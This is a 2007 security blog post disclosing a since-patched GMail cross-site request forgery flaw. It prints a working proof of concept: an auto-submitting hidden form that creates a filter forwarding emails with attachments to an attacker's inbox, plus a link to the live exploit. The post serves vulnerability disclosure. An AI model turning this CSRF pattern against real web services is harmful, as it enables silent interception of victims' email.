---
title: Google GMail E-mail Hijack Technique
author: petko-d-petkov
date: Tue, 25 Sep 2007 18:50:33 GMT
template: this/views/post.jade
---

In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations.

The following sequence of screenshots describes how the attack works.

<div class="screen">[![GGEHT Seq1](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq1-248x150.jpg "GGEHT Seq1")](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq1.jpg) [![GGEHT Seq2](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq2-248x150.jpg "GGEHT Seq2")](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq2.jpg) [![GGEHT Seq3](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq3-248x150.jpg "GGEHT Seq3")](http://www.gnucitizen.org/static/blog/2007/09/ggeht-seq3.jpg)</div>

The victim visits a malicious page while being logged into GMail. Upon that, the page performs a `multipart/form-data` `POST` to one of the GMail alternative interfaces and injects a filter into the victim's filter list. In the example above, the attacker writes a filter, which simply looks for emails with attachments and forward them to an email of their choice. This filter will automatically transfer all emails matching the rule. Keep in mind that future emails will be forwarded as well. The attack will remain **present** for as long as the victim has the filter within their filter list, even if the initial vulnerability, which was the cause of the injection, is fixed by Google.

The technique used in this example is known as Cross-site request forgery, or simply CSRF. I am not planning to go into details how it works. Just look it up on this blog or with your favourite search engine.

I am not planning to release the details of this vulnerability for now. The exploit was verified by [Ryan Naraine](http://blogs.zdnet.com/security/) and several close friends. It does work and it is nasty if you ask me.

**UPDATE 2007/09/28**: I promised to release the POC as soon as Google fixes the vulnerability. Well they did. So, here are the details:

    <form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
    	<input type="hidden" name="cf2_emc" value="true"/> 
    	<input type="hidden" name="cf2_email" value="evilinbox@mailinator.com"/> 
    	<input type="hidden" name="cf1_from" value=""/> 
    	<input type="hidden" name="cf1_to" value=""/> 
    	<input type="hidden" name="cf1_subj" value=""/> 
    	<input type="hidden" name="cf1_has" value=""/> 
    	<input type="hidden" name="cf1_hasnot" value=""/> 
    	<input type="hidden" name="cf1_attach" value="true"/> 
    	<input type="hidden" name="tfi" value=""/> 
    	<input type="hidden" name="s" value="z"/> 
    	<input type="hidden" name="irf" value="on"/> 
    	<input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
    </form> 
    <script> 
    	document.forms[0].submit();
    </script>

_The actual exploit can be launched from [here](http://www.gnucitizen.org/static/blog/2007/09/ggeht-exploit.htm). It makes use of a CSRF redirection utility to simplify the process._
